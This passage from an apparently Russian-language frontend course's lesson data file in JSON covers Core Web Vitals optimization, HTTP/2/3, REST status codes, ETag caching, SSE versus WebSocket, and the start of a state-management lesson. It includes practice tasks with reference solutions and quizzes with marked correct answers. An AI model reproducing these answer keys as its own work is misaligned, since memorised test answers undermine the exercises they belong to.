      "initialHtml": "<div id=\"perf-app\">\n  <h3>Симулятор оптимизации ввода (Debounce)</h3>\n  <input id=\"search-input\" placeholder=\"Начните быстро печатать текст...\" style=\"width:100%; padding:8px; background:#03060a; color:#2dff8a; border:1px solid #30363d; font-family:monospace;\" />\n  <div style=\"display:flex; gap:16px; margin-top:12px;\">\n    <div style=\"flex:1; padding:10px; background:#161b22; border:1px solid #f85149; border-radius:6px;\">\n      <strong style=\"color:#f85149;\">Без Debounce (вызовы API):</strong>\n      <div id=\"raw-count\" style=\"font-size:24px; font-weight:bold;\">0</div>\n    </div>\n    <div style=\"flex:1; padding:10px; background:#161b22; border:1px solid #2dff8a; border-radius:6px;\">\n      <strong style=\"color:#2dff8a;\">С Debounce 300ms:</strong>\n      <div id=\"debounced-count\" style=\"font-size:24px; font-weight:bold;\">0</div>\n    </div>\n  </div>\n</div>",
      "initialCss": "#perf-app {\n  font-family: monospace;\n  color: #e6edf3;\n  padding: 16px;\n  background: #0d1117;\n  border-radius: 8px;\n}",
      "initialJs": "const input = document.getElementById('search-input');\nconst rawEl = document.getElementById('raw-count');\nconst debEl = document.getElementById('debounced-count');\n\nlet rawCount = 0;\nlet debCount = 0;\n\nfunction debounce(fn, delay) {\n  let timer;\n  return (...args) => {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn(...args), delay);\n  };\n}\n\nconst handleDebounced = debounce(() => {\n  debCount++;\n  debEl.textContent = debCount;\n}, 300);\n\ninput.addEventListener('input', () => {\n  rawCount++;\n  rawEl.textContent = rawCount;\n  handleDebounced();\n});",
      "instructions": "Практика Web Performance:\n1. Быстро напечатайте слово в инпуте и сравните счетчики\n2. Обратите внимание, как debounce сокращает число тяжелых вызовов в 5-10 раз, разгружая Main Thread\n3. Попробуйте изменить задержку debounce с 300ms на 500ms"
    },
    "task": {
      "title": "Аудит и комплексная оптимизация страницы каталога по Core Web Vitals",
      "scenario": "Страница каталога интернет-магазина провалила аудит Lighthouse (Score: 38/100): LCP равен 4.8s из-за неоптимизированного баннера, CLS составляет 0.45 из-за отсутствия размеров у карточек товаров, а поисковая строка замораживает интерфейс (INP > 600ms). Вам нужно реализовать модуль оптимизации.",
      "criteria": [
        "Реализовать HOF-утилиту debounce(fn, delayMs) для оптимизации инпута поиска",
        "Сформировать правильную HTML-разметку LCP-баннера с форматом picture (AVIF, WebP), fetchpriority='high' и явными width/height",
        "Задать CSS-правило aspect-ratio для карточек каталога для устранения CLS",
        "Написать асинхронную функцию chunkedProcessing(items, processFn, chunkSize)",
        "Соблюдать стандарты Core Web Vitals (LCP <= 2.5s, INP <= 200ms, CLS <= 0.1)"
      ],
      "starterCode": {
        "js": "// Реализуйте утилиты оптимизации производительности\nfunction debounce(fn, delayMs) {\n  // Ваш код\n}\n\nasync function chunkedProcessing(items, processFn, chunkSize = 50) {\n  // Разбивка длинной задачи\n}"
      },
      "hints": [
        "В debounce сохраняйте let timer и сбрасывайте через clearTimeout",
        "Для уступки потока используйте await new Promise(r => setTimeout(r, 0))",
        "В разметке баннера используйте <picture><source srcset='...avif' type='image/avif'><img fetchpriority='high' width='1200' height='600'>"
      ],
      "solution": {
        "js": "function debounce(fn, delayMs = 300) {\n  let timer = null;\n  return function (...args) {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn.apply(this, args), delayMs);\n  };\n}\n\nasync function chunkedProcessing(items = [], processFn, chunkSize = 50) {\n  const results = [];\n  for (let i = 0; i < items.length; i += chunkSize) {\n    const chunk = items.slice(i, i + chunkSize);\n    for (const item of chunk) {\n      results.push(processFn(item));\n    }\n    // Уступка Main Thread браузеру для отрисовки кадров\n    await new Promise((resolve) => setTimeout(resolve, 0));\n  }\n  return results;\n}",
        "explanation": "debounce устраняет спам вызовов и разгружает Main Thread (улучшая INP). chunkedProcessing разбивает длинную задачу на микропакеты, предотвращая зависание интерфейса."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro5-q1",
          "question": "Какое пороговое значение метрики LCP (Largest Contentful Paint) считается отличным (Good) по стандарту Google Core Web Vitals?",
          "options": [
            "<= 100 миллисекунд",
            "<= 2.5 секунды",
            "<= 5.0 секунд",
            "<= 0.1"
          ],
          "correctIndex": 1,
          "explanation": "По стандарту Google Core Web Vitals значение LCP считается хорошим (Good / в зеленой зоне), если оно составляет 2.5 секунды или меньше."
        },
        {
          "id": "pro5-q2",
          "question": "Какую проблему решает метрика INP (Interaction to Next Paint), сменившая FID в Core Web Vitals?",
          "options": [
            "Измеряет размер JavaScript бандла",
            "Измеряет задержку между действием пользователя (клик, ввод) и отрисовкой следующего кадра с визуальным откликом интерфейса",
            "Проверяет правильность контрастности цветов",
            "Измеряет скорость интернет-соединения"
          ],
          "correctIndex": 1,
          "explanation": "Метрика INP (Interaction to Next Paint) оценивает общую отзывчивость страницы на протяжении всего времени сессии: за сколько миллисекунд браузер успевает обновить экран после клика или нажатия клавиши (норма <= 200 мс)."
        },
        {
          "id": "pro5-q3",
          "question": "Почему добавление атрибута loading='lazy' на главное LCP-изображение первого экрана является грубой ошибкой?",
          "options": [
            "loading='lazy' ломает JavaScript на странице",
            "Браузер откладывает загрузку такого изображения, ожидая завершения рендеринга страницы, что искусственно ухудшает LCP на 1-2 секунды",
            "Картинка вообще не загрузится",
            "loading='lazy' запрещен стандартом W3C"
          ],
          "correctIndex": 1,
          "explanation": "loading='lazy' предназначен только для изображений ниже первого экрана. На LCP-элементе он заставляет браузер отложить сетевой запрос, что приводит к критическому ухудшению показателя LCP."
        },
        {
          "id": "pro5-q4",
          "question": "Как эффективно защитить страницу от высокого показателя сдвига макета (CLS)?",
          "options": [
            "Отключить загрузку картинок",
            "Всегда указывать атрибуты width и height на тегах <img> или задавать свойство aspect-ratio в CSS, а также использовать скелетонные экраны",
            "Увеличить размер шрифта",
            "Использовать position: absolute для всех элементов"
          ],
          "correctIndex": 1,
          "explanation": "Указание width/height или aspect-ratio позволяет браузеру мгновенно зарезервировать прямоугольную область точного размера в макете до скачивания изображения, снижая CLS до 0."
        },
        {
          "id": "pro5-q5",
          "question": "Какое свойство CSS-шрифтов предотвращает эффект невидимого текста (FOIT) при загрузке кастомного веб-шрифта?",
          "options": [
            "font-style: italic;",
            "font-display: swap;",
            "font-weight: bold;",
            "font-rendering: fast;"
          ],
          "correctIndex": 1,
          "explanation": "Директива font-display: swap в @font-face указывает браузеру мгновенно отобразить текст системным резервным шрифтом и заменить его на кастомный сразу после скачивания файла шрифта."
        }
      ]
    }
  },
  {
    "id": "pro-6",
    "moduleId": "pro",
    "level": 6,
    "title": "Сетевой стек: HTTP/HTTPS, REST API, WebSocket и SSE",
    "subtitle": "HTTP/2/3, REST архитектура, статус-коды, ETag кэширование, WebSockets и Server-Sent Events",
    "description": "Освойте современный сетевой стек фронтенд-инженера: эволюцию протоколов HTTP/1.1 -> HTTP/2 -> HTTP/3, семантику методов и статус-кодов REST API, ETag и Cache-Control валидацию, сравнение WebSockets vs Server-Sent Events (SSE) для real-time связи.",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "network",
      "http",
      "https",
      "rest-api",
      "websocket",
      "sse",
      "caching",
      "etag"
    ],
    "theory": {
      "overview": "Фронтенд-приложение не существует в вакууме: оно непрерывно обменивается данными с бэкенд-серверами, микросервисами и сторонними API через сетевой стек.\n\nПонимание протоколов передачи данных — ключевой навык для проектирования надежных, быстрых и отказоустойчивых интерфейсов. В этом уроке мы изучим эволюцию HTTP/2 и HTTP/3, детально разберём семантику REST API и статус-кодов, настроим HTTP-кэширование через ETag и сравним три технологии связи в реальном времени: Polling, Server-Sent Events (SSE) и WebSockets.",
      "sections": [
        {
          "title": "Протоколы HTTP/1.1 vs HTTP/2 vs HTTP/3 и безопасность HTTPS",
          "content": "Протокол HTTP (HyperText Transfer Protocol) — фундамент обмена данными в вебе.\n\nЭволюция протокола HTTP:\n\n1. HTTP/1.1 (1997 год):\n- Текстовый протокол. Для каждого запроса открывалось отдельное TCP-соединение (или переиспользовалось через Keep-Alive).\n- Главная проблема: Head-of-Line Blocking (Блокировка начала очереди) — если один тяжелый запрос завис, все последующие запросы в этой очереди ждут.\n- Браузеры ограничивали параллельные соединения до 6 штук на один домен.\n\n2. HTTP/2 (2015 год):\n- Бинарный протокол поверх одного TCP-соединения.\n- Мультиплексирование (Multiplexing): десятки запросов и ответов передаются параллельно чередующимися фреймами без блокировки очереди!\n- Сжатие заголовков HPACK (сокращает оверхед сетевых заголовков на 85%).\n\n3. HTTP/3 (2022 год):\n- Работает поверх нового транспортного протокола QUIC на базе UDP (вместо медленного TCP Handshake).\n- Мгновенное 0-RTT переподключение при смене Wi-Fi на 4G без потери пакетов.\n\nБезопасность HTTPS (TLS/SSL):\nШифрует весь трафик между браузером и сервером. Защищает от атак Man-in-the-Middle (MitM), подмены трафика провайдером и перехвата паролей/кук.",
          "image": {
            "src": "/images/lessons/web-network-protocols.svg",
            "alt": "Сетевой стек: REST API, Server-Sent Events SSE, WebSockets и статус-коды",
            "caption": "REST API для CRUD запросов, SSE для однонаправленных потоков (AI, котировки) и WebSocket для 2-way real-time связи"
          },
          "codeExample": {
            "language": "bash",
            "code": "# Просмотр заголовков HTTP/2 ответа через curl:\ncurl -I https://api.academy.ru/v1/users\n\n# Пример HTTP/2 ответа:\n# HTTP/2 200\n# content-type: application/json; charset=utf-8\n# cache-control: public, max-age=3600, stale-while-revalidate=60\n# etag: W/\"65a1f-18dc0\"\n# server: cloudflare",
            "title": "Заголовки сетевого ответа протокола HTTP/2",
            "explanation": "HTTP/2 ответ возвращает статус 200, ETag хэш для валидации кэша и директиву stale-while-revalidate для мгновенного отклика."
          }
        },
        {
          "title": "REST API: Семантика методов, идемпотентность и статус-коды",
          "content": "REST (Representational State Transfer) — доминирующий архитектурный стиль взаимодействия клиента и сервера.\n\nСемантика HTTP-методов:\n1. `GET` — чтение ресурса. Безопасный (не меняет данные на сервере) и идемпотентный.\n2. `POST` — создание нового ресурса (`/api/users`). Не идемпотентный (повторные вызовы создадут дубликаты пользователей!).\n3. `PUT` — полная замена существующего ресурса. Идемпотентный.\n4. `PATCH` — частичное обновление полей объекта (`{ status: 'active' }`).\n5. `DELETE` — удаление ресурса. Идемпотентный.\n6. `OPTIONS` — Preflight-запрос CORS для проверки разрешенных методов.\n\nHTTP Статус-коды (Карта инженера):\n- `2xx Успех`: `200 OK`, `201 Created` (успешное создание), `204 No Content` (успешное удаление без тела ответа).\n- `3xx Перенаправление`: `301 Moved Permanently` (редирект), `304 Not Modified` (данные не изменились, взять из кэша браузера!).\n- `4xx Ошибки клиента`: `400 Bad Request` (ошибка валидации), `401 Unauthorized` (пользователь не залогинен), `403 Forbidden` (залогинен, но нет прав/роли), `404 Not Found`, `422 Unprocessable Entity`, `429 Too Many Requests` (Rate Limiting).\n- `5xx Ошибки сервера`: `500 Internal Server Error`, `502 Bad Gateway`, `503 Service Unavailable`.",
          "codeExample": {
            "language": "javascript",
            "code": "// Универсальный обработчик статус-кодов API:\nasync function apiRequest(url, options = {}) {\n  const response = await fetch(url, options);\n  \n  if (response.status === 204) return null; // No Content\n  \n  if (!response.ok) {\n    if (response.status === 401) {\n      // Редирект на экран логина (токен истек)\n      window.location.href = '/login';\n      throw new Error('Сессия истекла');\n    }\n    if (response.status === 403) {\n      throw new Error('Недостаточно прав для выполнения действия');\n    }\n    if (response.status === 429) {\n      throw new Error('Слишком много запросов. Подождите 1 минуту.');\n    }\n    const errorData = await response.json().catch(() => ({}));\n    throw new Error(errorData.message || `Ошибка сервера: ${response.status}`);\n  }\n  \n  return response.json();\n}",
            "title": "Обработка статус-кодов 401, 403, 429 и 204 в fetch",
            "explanation": "Профессиональный клиент разделяет 401 (нет авторизации) и 403 (нет прав), а также корректно обрабатывает пустой ответ 204 No Content."
          }
        },
        {
          "title": "Связь в реальном времени: WebSockets vs Server-Sent Events (SSE)",
          "content": "Когда интерфейс требует мгновенного обновления данных без ручной перезагрузки страницы (Real-Time UI):\n\n1. Polling (Опрос по таймеру — устаревший подход):\nКлиент каждые 3 секунды отправляет `GET /messages`. 99% запросов возвращают пустой ответ, нагружая сервер и расходуя батарею смартфона.\n\n2. Server-Sent Events (SSE — Однонаправленный стрим):\n- Сервер держит открытое соединение `Content-Type: text/event-stream` и отправляет события клиенту по мере их появления.\n- В браузере поддерживается нативным API `const eventSource = new EventSource('/api/stream')`.\n- Автоматически восстанавливает соединение при обрыве сети (Auto-Reconnect)!\n- Идеально для: генерации ответов нейросетями (LLM ChatGPT стриминг), уведомлений, биржевых котировок, спортивных трансляций.\n\n3. WebSockets (Двунаправленный канал `ws://` / `wss://`):\n- Клиент отправляет HTTP-запрос с заголовком `Upgrade: websocket`. Сервер отвечает `101 Switching Protocols`.\n- Устанавливается постоянный полнодуплексный TCP-сокет. И клиент, и сервер могут в любой момент отправлять бинарные или текстовые фреймы с минимальным оверхедом (2–8 байт!).\n- Идеально для: онлайн-игр, чатов, совместного редактирования документов (Figma, Miro, Google Docs).",
          "codeExample": {
            "language": "javascript",
            "code": "// 1. Клиент Server-Sent Events (SSE) для стриминга ответов LLM/AI:\nconst sse = new EventSource('/api/ai-completion');\nsse.onmessage = (event) => {\n  const token = JSON.parse(event.data).text;\n  document.getElementById('ai-response').textContent += token;\n};\nsse.onerror = () => sse.close();\n\n// 2. Клиент WebSocket для двустороннего чата:\nconst ws = new WebSocket('wss://api.academy.ru/chat');\nws.onopen = () => {\n  console.log('WS соединение установлено');\n  ws.send(JSON.stringify({ type: 'join', room: 'frontend-interns' }));\n};\nws.onmessage = (event) => {\n  const msg = JSON.parse(event.data);\n  renderNewMessage(msg);\n};",
            "title": "Реализация клиентов SSE (EventSource) и WebSocket",
            "explanation": "SSE идеально подходит для одностороннего стриминга текста от AI, а WebSocket обеспечивает двустороннюю интерактивность чата."
          }
        },
        {
          "title": "HTTP-кэширование: Cache-Control, ETag и 304 Not Modified",
          "content": "Кэширование — самый мощный способ ускорения веб-приложений и снижения нагрузки на серверную инфраструктуру:\n\n1. Механизм ETag (Entity Tag) и условные запросы:\n- Сервер вычисляет хэш содержимого ресурса и отправляет его в заголовке: `ETag: \"68b329da\"`.\n- При следующем запросе браузер отправляет заголовок: `If-None-Match: \"68b329da\"`.\n- Если данные на сервере НЕ изменились, сервер отвечает пустым заголовком `304 Not Modified` (0 байт тела!), и браузер мгновенно берет данные из локального дискового кэша!\n\n2. Заголовок `Cache-Control`:\n- `max-age=3600` — ресурс свежий в течение 3600 секунд (1 час).\n- `no-cache` — кэшировать можно, но перед каждым использованием ОБЯЗАТЕЛЬНО валидировать с сервером через ETag.\n- `no-store` — СТРОГО запрещено кэшировать (для платежных данных и приватных токенов).\n- `stale-while-revalidate=60` — современная стратегия: браузер МГНОВЕННО отдает пользователю чуть устаревший кэш, параллельно в фоне делая тихий запрос на сервер для обновления данных.",
          "codeExample": {
            "language": "javascript",
            "code": "// Настройка кэширования для статических файлов в Node.js / Express:\napp.use('/assets', express.static('dist/assets', {\n  maxAge: '1y',\n  immutable: true // Файлы с хэшами (index-BPe6.js) никогда не изменятся!\n}));\n\n// Настройка для динамического API с фоновой ревалидацией:\napp.get('/api/catalog', (req, res) => {\n  res.setHeader(\n    'Cache-Control',\n    'public, max-age=60, stale-while-revalidate=300'\n  );\n  res.json(catalogData);\n});",
            "title": "Настройка стратегий immutable и stale-while-revalidate",
            "explanation": "immutable кэширует JS/CSS бандлы на 1 год без повторных запросов. stale-while-revalidate обеспечивает мгновенную отдачу каталога."
          }
        }
      ],
      "seniorTips": [
        "Всегда разделяйте статусы `401 Unauthorized` (пользователь не авторизован -> редирект на экран логина) и `403 Forbidden` (пользователь авторизован, но у него нет прав -> показ экрана 'Доступ запрещен').",
        "Для стриминга текста нейросетей (ChatGPT, Claude) или биржевых котировок используйте Server-Sent Events (SSE) вместо WebSocket. SSE работает по стандартному HTTP/2 и автоматически переподключается при обрыве связи.",
        "Для статических файлов с хэшами в именах (`index-D3f8.js`) всегда выставляйте `Cache-Control: public, max-age=31536000, immutable` — это навсегда исключает лишние сетевые запросы.",
        "В REST API используйте существительные во множественном числе для именования ресурсов (`/api/v1/users`, `/api/v1/orders/12/items`), а действие определяйте HTTP-методом (GET, POST, DELETE)."
      ],
      "commonMistakes": [
        {
          "bad": "// Использование GET для удаления ресурса\n<a href=\"/api/delete-user?id=42\">Удалить пользователя</a>",
          "good": "// Использование семантического DELETE метода\nfetch('/api/users/42', { method: 'DELETE' });",
          "reason": "GET-запросы должны быть безопасными и не мутировать данные. Поисковые боты и предзагрузчики ссылок могут случайно перейти по ссылке и удалить все данные."
        },
        {
          "bad": "// Сервер возвращает 200 OK на ошибку\nHTTP/1.1 200 OK\n{ \"error\": true, \"message\": \"User not found\" }",
          "good": "HTTP/1.1 404 Not Found\n{ \"message\": \"User not found\" }",
          "reason": "Возврат 200 OK на ошибки ломает стандартную обработку в response.ok, кэширование браузера и системы мониторинга (Sentry/Datadog)."
        },
        {
          "bad": "// Использование WebSocket для редких разовых уведомлений\nconst ws = new WebSocket('wss://...'); // Держит постоянный открытый порт",
          "good": "const sse = new EventSource('/api/notifications');",
          "reason": "WebSocket требует удержания постоянного TCP-сокета на сервере, что расходует память и соединения. Для редких серверных пушей SSE в разы проще и эффективнее."
        }
      ],
      "keyTakeaways": [
        "HTTP/2 и HTTP/3 обеспечивают мультиплексирование потоков и сжатие заголовков поверх одного соединения.",
        "REST API строится на ресурсах и семантических методах (GET, POST, PUT, PATCH, DELETE) с идемпотентностью.",
        "Статусы 2xx означают успех, 304 — кэш валиден, 401 — нет логина, 403 — нет прав, 429 — Rate Limit, 5xx — сбой сервера.",
        "SSE — идеален для одностороннего стриминга (AI, котировки) с авто-реконнектом. WebSocket — для двусторонних real-time чатов и игр.",
        "Стратегия `stale-while-revalidate` и ETag валидация ускоряют повторную загрузку данных до 0 мс."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"network-app\">\n  <h3>Симулятор REST API Клиента и статус-кодов</h3>\n  <div style=\"display:flex; gap:8px; margin-bottom:12px;\">\n    <button id=\"btn-200\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:6px 12px; font-weight:bold; cursor:pointer;\">200 OK</button>\n    <button id=\"btn-401\" style=\"background:#ffb02e; color:#0a0e13; border:none; padding:6px 12px; font-weight:bold; cursor:pointer;\">401 Auth Error</button>\n    <button id=\"btn-403\" style=\"background:#ff7b72; color:#fff; border:none; padding:6px 12px; font-weight:bold; cursor:pointer;\">403 Forbidden</button>\n    <button id=\"btn-304\" style=\"background:#29e7ff; color:#0a0e13; border:none; padding:6px 12px; font-weight:bold; cursor:pointer;\">304 ETag Cache</button>\n  </div>\n  <div id=\"net-log\" style=\"padding:12px; background:#161b22; border:1px solid #30363d; border-radius:6px; min-height:80px; font-family:monospace;\"></div>\n</div>",
      "initialCss": "#network-app {\n  font-family: monospace;\n  color: #e6edf3;\n  padding: 16px;\n  background: #0d1117;\n  border-radius: 8px;\n}",
      "initialJs": "const logEl = document.getElementById('net-log');\nconst log = (msg, color = '#2dff8a') => logEl.innerHTML = `<span style='color:${color}'>${msg}</span>`;\n\ndocument.getElementById('btn-200').addEventListener('click', () => {\n  log('HTTP/2 200 OK: Данные успешно получены с сервера [Размер: 1.4 КБ]');\n});\ndocument.getElementById('btn-401').addEventListener('click', () => {\n  log('HTTP/2 401 Unauthorized: Токен авторизации истек -> Редирект на /login', '#ffb02e');\n});\ndocument.getElementById('btn-403').addEventListener('click', () => {\n  log('HTTP/2 403 Forbidden: Доступ запрещен (Требуется роль ADMIN)', '#ff7b72');\n});\ndocument.getElementById('btn-304').addEventListener('click', () => {\n  log('HTTP/2 304 Not Modified: If-None-Match ETag совпал -> Мгновенная отдача из кэша (0 байт трафика!)', '#29e7ff');\n});",
      "instructions": "Практика с сетевыми статусами:\n1. Нажмите поочередно кнопки статус-кодов и изучите логику обработки\n2. Обратите внимание на статус 304 Not Modified — он экономит 100% трафика тела ответа\n3. Добавьте симуляцию статуса 429 Too Many Requests с выводом времени ожидания Retry-After"
    },
    "task": {
      "title": "Разработка отказоустойчивого сетевого HTTP-клиента с ETag кэшем и повторными попытками",
      "scenario": "Вам необходимо создать отказоустойчивый сетевой модуль HttpClient для взаимодействия с REST API: клиент должен автоматически подставлять ETag заголовки кэширования, обрабатывать статусы 401/403/429 и выполнять автоматические повторные попытки (Retry с Exponential Backoff) при сетевых сбоях 500/503.",
      "criteria": [
        "Класс HttpClient хранит кэш ETag хэшей в Map",
        "Метод request(url, options) отправляет заголовок If-None-Match при наличии кэшированного ETag",
        "При получении 304 Not Modified возвращает данные из локального кэша",
        "Обработка ошибок 401 (вызов onUnauthorized колбэка) и 403 (вызов onForbidden)",
        "При ошибках 500/502/503 выполняется до maxRetries повторных запросов с увеличивающейся задержкой"
      ],
      "starterCode": {
        "js": "// Реализуйте сетевой клиент HttpClient\nclass HttpClient {\n  constructor(config = {}) {\n    this.etagCache = new Map();\n  }\n\n  async get(url) {\n    // Ваш код\n  }\n}"
      },
      "hints": [
        "Сохраняйте в Map: this.etagCache.set(url, { etag, data })",
        "Для паузы между retry используйте await new Promise(r => setTimeout(r, delay))",
        "При ответе 304 возвращайте this.etagCache.get(url).data"
      ],
      "solution": {
        "js": "class HttpClient {\n  constructor({\n    onUnauthorized = () => {},\n    onForbidden = () => {},\n    maxRetries = 3\n  } = {}) {\n    this.onUnauthorized = onUnauthorized;\n    this.onForbidden = onForbidden;\n    this.maxRetries = maxRetries;\n    this.etagCache = new Map();\n  }\n\n  async get(url, attempt = 1) {\n    const headers = { 'Accept': 'application/json' };\n    const cached = this.etagCache.get(url);\n    if (cached?.etag) {\n      headers['If-None-Match'] = cached.etag;\n    }\n\n    try {\n      const res = await fetch(url, { method: 'GET', headers });\n\n      if (res.status === 304 && cached) {\n        return cached.data;\n      }\n\n      if (res.status === 401) {\n        this.onUnauthorized();\n        throw new Error('401 Unauthorized');\n      }\n      if (res.status === 403) {\n        this.onForbidden();\n        throw new Error('403 Forbidden');\n      }\n\n      if (!res.ok && res.status >= 500 && attempt <= this.maxRetries) {\n        const delay = Math.pow(2, attempt) * 200; // Exponential backoff\n        await new Promise((r) => setTimeout(r, delay));\n        return this.get(url, attempt + 1);\n      }\n\n      if (!res.ok) {\n        throw new Error(`HTTP Error ${res.status}`);\n      }\n\n      const data = await res.json();\n      const newEtag = res.headers.get('ETag');\n      if (newEtag) {\n        this.etagCache.set(url, { etag: newEtag, data });\n      }\n      return data;\n    } catch (err) {\n      if (attempt <= this.maxRetries && !err.message.includes('401') && !err.message.includes('403')) {\n        await new Promise((r) => setTimeout(r, Math.pow(2, attempt) * 200));\n        return this.get(url, attempt + 1);\n      }\n      throw err;\n    }\n  }\n}",
        "explanation": "HttpClient реализует промышленный стандарт: ETag валидацию с поддержкой 304 Not Modified, перехват авторизационных статусов 401/403 и умный retry с экспоненциальной задержкой при серверных сбоях 5xx."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro6-q1",
          "question": "В чём заключается фундаментальное отличие протокола Server-Sent Events (SSE) от WebSockets?",
          "options": [
            "SSE работает быстрее в 100 раз",
            "SSE — это однонаправленный поток данных от сервера к клиенту поверх стандартного HTTP с автоматическим переподключением, а WebSocket — постоянный полнодуплексный двунаправленный канал",
            "SSE требует отдельного порта, а WebSocket работает через HTTP",
            "WebSocket не поддерживает передачу текста"
          ],
          "correctIndex": 1,
          "explanation": "SSE обеспечивает легковесный поток событий от сервера к клиенту (идеален для AI стриминга и котировок) поверх HTTP. WebSocket создает двустороннее равноправное соединение для игр и чатов."
        },
        {
          "id": "pro6-q2",
          "question": "Какое поведение обеспечивает статус-код ответа HTTP 304 Not Modified?",
          "options": [
            "Сервер удалил ресурс",
            "Сервер подтверждает, что запрошенный ресурс не изменился с момента предыдущего запроса (ETag совпал), и клиент мгновенно берет тело ответа из локального кэша",
            "Сервер перегружен",
            "Доступ запрещен"
          ],
          "correctIndex": 1,
          "explanation": "Ответ 304 Not Modified возвращается сервером без тела ответа (0 байт), подтверждая, что версия в кэше браузера актуальна, экономя трафик и ускоряя загрузку."
        },
        {
          "id": "pro6-q3",
          "question": "В чём разница между ошибками HTTP 401 Unauthorized и HTTP 403 Forbidden?",
          "options": [
            "Ошибки полностью одинаковы",
            "401 означает, что пользователь не аутентифицирован (нет валидного токена), а 403 — пользователь аутентифицирован, но не имеет прав доступа к данному ресурсу",
            "401 возникает на мобильных, 403 на десктопах",
            "403 означает ошибку сервера"
          ],
          "correctIndex": 1,
          "explanation": "401 (Unauthenticated) требует прохождения входа в систему (логина). 403 (Forbidden) означает, что сервер знает, кто вы, но ваши права/роли не позволяют выполнить действие."
        },
        {
          "id": "pro6-q4",
          "question": "Какое ключевое преимущество дал протокол HTTP/2 по сравнению с HTTP/1.1?",
          "options": [
            "HTTP/2 удалил заголовки",
            "Мультиплексирование запросов: передача множества параллельных запросов и ответов через единое TCP-соединение без блокировки начала очереди (Head-of-Line Blocking)",
            "HTTP/2 работает без интернета",
            "HTTP/2 запретил использование cookies"
          ],
          "correctIndex": 1,
          "explanation": "Мультиплексирование HTTP/2 позволяет браузеру скачивать десятки CSS, JS и изображений параллельно через один сокет, устраняя задержки ожидания в очереди."
        },
        {
          "id": "pro6-q5",
          "question": "Что означает понятие «Идемпотентность HTTP-метода» (Idempotency)?",
          "options": [
            "Метод выполняется быстрее остальных",
            "Многократное выполнение одного и того же запроса приводит к тому же результату на сервере, что и однократный вызов (GET, PUT, DELETE)",
            "Метод шифрует данные",
            "Метод не может быть вызван повторно"
          ],
          "correctIndex": 1,
          "explanation": "Идемпотентный метод (GET, PUT, DELETE) можно безопасно повторять при сбоях сети: повторный вызов DELETE /users/42 или PUT /users/42 оставит состояние сервера неизменным."
        }
      ]
    }
  },
  {
    "id": "pro-7",
    "moduleId": "pro",
    "level": 7,
    "title": "Архитектура State Management и Паттерны проектирования в SPA",
    "subtitle": "UI = f(State), Redux-архитектура, Observer/PubSub, Immutable State и Feature-Sliced Design (FSD)",
    "description": "Освойте архитектуру управления состоянием в Single Page Applications (SPA): математическую формулу UI = f(State), паттерны Observer и PubSub, однонаправленный поток данных Redux (Actions, Reducers, Store), селекторы и модульную методологию Feature-Sliced Design (FSD).",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "state-management",
      "architecture",
      "redux",
      "pubsub",
      "observer",
      "fsd",
      "immutability",
      "spa"
    ],
    "theory": {
      "overview": "По мере роста фронтенд-приложения от пары кнопок до масштабного SPA с десятками экранов, корзиной, чатом и авторизацией, главной проблемой становится управление состоянием (State Management).\n\nХаотичное разбрасывание данных по компонентам (Props Drilling) и мутации глобальных переменных превращают код в «спагетти», где изменение в одном виджете непредсказуемо ломает другой. В этом уроке мы изучим фундаментальную концепцию `UI = f(State)`, реализуем паттерны Observer и PubSub, разберём Redux-архитектуру с чистыми редьюсерами и освоим правила масштабируемой архитектуры Feature-Sliced Design (FSD).",
      "sections": [
        {
          "title": "Что такое State (Состояние) и концепция UI = f(State)",
          "content": "Фундаментальный принцип современной фронтенд-разработки (React, Vue, Solid, Svelte) описывается формулой:\n`UI = f(State)`\nИнтерфейс пользователя (UI) является чистой математической проекцией (функцией `f`) от текущего состояния данных (`State`). Вы не манипулируете DOM-узлами вручную — вы меняете состояние, а фреймворк декларативно обновляет экран.\n\nКлассификация состояния в SPA:\n1. **Server State** — кэш данных от API (список товаров, профиль пользователя). Требует инвалидации, кэширования и индикаторов загрузки/ошибок (React Query / TanStack Query, RTK Query).\n2. **Client / Global UI State** — данные, разделяемые несколькими независимыми виджетами (текущая тема, статус боковой панели, товары в корзине, токен сессии).\n3. **Local Component State** — изолированное состояние конкретного компонента (открыт ли селект, текст внутри инпута, активный таб).\n4. **URL State** — состояние, синхронизированное со строкой браузера (`/catalog?category=laptops&sort=price_asc&page=2`). Золотое правило: все фильтры, поисковые запросы и пагинация ДОЛЖНЫ храниться в URL, чтобы пользователь мог отправить ссылку другу или обновить страницу!",
          "image": {
            "src": "/images/lessons/web-state-architecture.svg",
            "alt": "Архитектура State Management: Redux flow, PubSub, UI = f(State) и FSD",
            "caption": "Однонаправленный поток данных Redux: Action -> Reducer -> Store -> UI. Слоистая архитектура Feature-Sliced Design"
          },
          "codeExample": {
            "language": "javascript",
            "code": "// Пример декларативной концепции UI = f(State):\nfunction renderUI(state) {\n  return `\n    <div class=\"app-layout theme-${state.theme}\">\n      <header>Привет, ${state.user ? state.user.name : 'Гость'}!</header>\n      <main>\n        ${state.isLoading ? '<div class=\"spinner\">Загрузка...</div>' : ''}\n        ${state.error ? `<div class=\"error\">${state.error}</div>` : ''}\n        <ul class=\"cart-list\">\n          ${state.cart.map((item) => `<li>${item.title} — ${item.price} ₽</li>`).join('')}\n        </ul>\n      </main>\n    </div>\n  `;\n}",
            "title": "Концепция UI как чистой функции от состояния",
            "explanation": "Рендеринг интерфейса полностью определяется объектом state. Изменение state.isLoading или state.cart мгновенно переводит UI в нужное состояние."
          }
        },
        {
          "title": "Паттерны проектирования: Observer (Наблюдатель) и PubSub",
